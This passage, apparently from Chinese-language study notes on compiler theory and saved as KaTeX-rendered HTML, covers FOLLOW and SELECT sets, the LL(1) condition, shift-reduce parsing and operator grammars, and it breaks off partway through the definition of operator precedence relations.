class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>，规定<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">$</mi><mo>∈</mo><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mrow><mo fence=\"true\">(</mo><mi>A</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">\\$ \\in FOLLOW\\left(A\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.80556em;vertical-align:-0.05556em;\"></span><span class=\"mord\">$</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">W</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">A</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>。</p>\n<h5 id=\"select集合\"><a class=\"markdownIt-Anchor\" href=\"#select集合\"></a> SELECT集合</h5>\n<p>对于文法中任意一条规则<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow \\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span></span></span></span>，定义<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mi>E</mi><mi>L</mi><mi>E</mi><mi>C</mi><mi>T</mi></mrow><annotation encoding=\"application/x-tex\">SELECT</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span></span></span></span>集合。</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mi>E</mi><mi>L</mi><mi>E</mi><mi>C</mi><mi>T</mi><mrow><mo fence=\"true\">(</mo><mi>A</mi><mo>→</mo><mi>α</mi><mo fence=\"true\">)</mo></mrow><mo>=</mo><mrow><mo fence=\"true\">{</mo><mtable rowspacing=\"0.3599999999999999em\" columnalign=\"left left\" columnspacing=\"1em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mrow><mo fence=\"true\">(</mo><mi>α</mi><mo fence=\"true\">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mtext>if </mtext><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi>α</mi><menclose notation=\"updiagonalstrike\"><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover></menclose><mi>ϵ</mi></mstyle></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mrow><mo fence=\"true\">(</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy=\"false\">(</mo><mi>α</mi><mo stretchy=\"false\">)</mo><mo>−</mo><mrow><mo fence=\"true\">{</mo><mi>ϵ</mi><mo fence=\"true\">}</mo></mrow><mo fence=\"true\">)</mo></mrow><mo>∪</mo><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mrow><mo fence=\"true\">(</mo><mi>A</mi><mo fence=\"true\">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mtext>if </mtext><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi>α</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mi>ϵ</mi></mstyle></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding=\"application/x-tex\">SELECT\\left(A\\rightarrow \\alpha\\right)=\n\n\\begin{cases}\n\nFIRST\\left(\\alpha\\right)&amp;\\text{if $\\alpha \\cancel{\\stackrel{*}{\\Rightarrow}} \\epsilon$}\\\\\n\n\\left(FIRST(\\alpha)-\\left\\{\\epsilon\\right\\}\\right)\\cup FOLLOW\\left(A\\right)&amp;\\text{if $\\alpha {\\stackrel{*}{\\Rightarrow}} \\epsilon$}\n\n\\end{cases}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:3.0000299999999998em;vertical-align:-1.25003em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size4\">{</span></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.69em;\"><span style=\"top:-3.69em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathdefault\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span><span style=\"top:-2.25em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathdefault\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">{</span><span class=\"mord mathdefault\">ϵ</span><span class=\"mclose delimcenter\" style=\"top:0em;\">}</span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">W</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">A</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.19em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:1em;\"></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.69em;\"><span style=\"top:-3.69em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord text\"><span class=\"mord\">if </span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord cancel-lap\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord cancel-pad\"><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span><span class=\"svg-align\" style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span style=\"height:0.992566em;\"><svg width='100%' height='0.992566em'><line x1='0' y1='100%' x2='100%' y2='0' stroke-width='0.046em'/></svg></span></span></span></span></span></span><span class=\"mord mathdefault\">ϵ</span></span></span></span><span style=\"top:-2.25em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord text\"><span class=\"mord\">if </span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord\"><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span><span class=\"mord mathdefault\">ϵ</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.19em;\"><span></span></span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></span></p>\n<h4 id=\"ll1文法的条件\"><a class=\"markdownIt-Anchor\" href=\"#ll1文法的条件\"></a> LL(1)文法的条件</h4>\n<p>当且仅当，文法中对每个非终结符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>的任意两个不同的规则，其<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mi>E</mi><mi>L</mi><mi>E</mi><mi>C</mi><mi>T</mi></mrow><annotation encoding=\"application/x-tex\">SELECT</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span></span></span></span>集合不<strong>相交</strong>。对于LL(1)文法，可以用自上而下的递归方法进行分析，且不存在回溯和死循环。</p>\n<h3 id=\"自下而上分析法\"><a class=\"markdownIt-Anchor\" href=\"#自下而上分析法\"></a> 自下而上分析法</h3>\n<p>基本思想与方法：“移进-规约“，将输入串中的字符从左到右push到stack中，一边移进一边分析。<strong>当栈顶符号形成某挑规则右部时</strong>，进行一次<strong>规约</strong>，将相应的右部符号串替换成规则左部的非终结符。重复这个过程，直到输入串都被push到stack中，且stack中只剩下<strong>右界符</strong><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">$</mi></mrow><annotation encoding=\"application/x-tex\">\\$</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.80556em;vertical-align:-0.05556em;\"></span><span class=\"mord\">$</span></span></span></span>和文法的开始符号，则匹配成功。</p>\n<p>从语法树的角度去看，自下而上的方法是<strong>从叶结点开始的</strong>。</p>\n<h4 id=\"算符优先分析法\"><a class=\"markdownIt-Anchor\" href=\"#算符优先分析法\"></a> 算符优先分析法</h4>\n<p>算符优先分析法简单、直观，但对文法有较高的要求。</p>\n<h5 id=\"算符文法\"><a class=\"markdownIt-Anchor\" href=\"#算符文法\"></a> 算符文法</h5>\n<p>设有文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>，若<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>中不出现形如<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>U</mi><mo>→</mo><mo>…</mo><mi>V</mi><mi>W</mi><mo>…</mo></mrow><annotation encoding=\"application/x-tex\">U\\rightarrow \\dots VW \\dots</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10903em;\">U</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">W</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span></span></span></span>，其中<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>V</mi></mrow><annotation encoding=\"application/x-tex\">V</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span></span></span></span>和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>W</mi></mrow><annotation encoding=\"application/x-tex\">W</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">W</span></span></span></span>是非终结字符，则称<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>是<strong>算符文法</strong>。</p>\n<p>在算符文法中，任何一个规则右部都不存在两个相邻的非终结字符。它有两个性质：</p>\n<ol>\n<li>在算符文法中任何句型都不含两个相邻的非终结字符。</li>\n<li>若<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">Ab</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\">b</span></span></span></span>或者<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>b</mi><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">bA</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">b</span><span class=\"mord mathdefault\">A</span></span></span></span>出现在算符文法的句型<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>中，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>是非终结字符，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">b</span></span></span></span>是终结字符，则<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>中任何包含<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">b</span></span></span></span>的短语必定包含<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>。</li>\n</ol>\n<blockquote>\n<p>回溯学习：</p>\n<p>假设<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mi>β</mi><mi>δ</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha \\beta \\delta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord mathdefault\" style=\"margin-right:0.03785em;\">δ</span></span></span></span>是文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>的一个句型，如果有</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mi>α</mi><mi>A</mi><mi>δ</mi><mo>∧</mo><mi>A</mi><mover><mo><mo>⇒</mo></mo><mo>+</mo></mover><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">S{\\stackrel{*}{\\Rightarrow}}\\alpha A \\delta \\land A {\\stackrel{+}{\\Rightarrow}} \\beta\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.992566em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord\"><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.03785em;\">δ</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∧</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.269641em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord\"><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.075201em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">+</span></span></span></span></span></span></span></span></span></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span></span></p>\n<p>则称<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>是相对于非终结字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>的、句型<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mi>β</mi><mi>δ</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha \\beta \\delta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord mathdefault\" style=\"margin-right:0.03785em;\">δ</span></span></span></span>的一个短语。</p>\n</blockquote>\n<p>这两个性质很好证明。</p>\n<h5 id=\"任意两个非终结符之间的优先关系\"><a class=\"markdownIt-Anchor\" href=\"#任意两个非终结符之间的优先关系\"></a> 任意两个非终结符之间的优先关系</h5>\n<p>设<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>是一个算符文法，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding=\"application/x-tex\">a</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span></span></span></span>和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">b</span></span></span></span>是任意两个终结符，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>P</mi><mo separator=\"true\">,</mo><mi>Q</mi><mo separator=\"true\">,</mo><mi>R</mi></mrow><annotation encoding=\"application/x-tex\">P, Q,R</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">Q</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span></span></span></span>是非终结符，定义算符优先关系：（这里打不出带点的小于号、大于号和等于号，所以用常规的符号代替）</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>a</mi><mo>=</mo><mi>b</mi><mtext> </mtext><mi mathvariant=\"normal\">当</mi><mi mathvariant=\"normal\">且</mi><mi mathvariant=\"normal\">仅</mi><mi mathvariant=\"normal\">当</mi><mtext> </mtext><mi>G</mi><mtext> </mtext><mi mathvariant=\"normal\">中</mi><mi mathvariant=\"normal\">含</mi><mi mathvariant=\"normal\">有</mi><mi 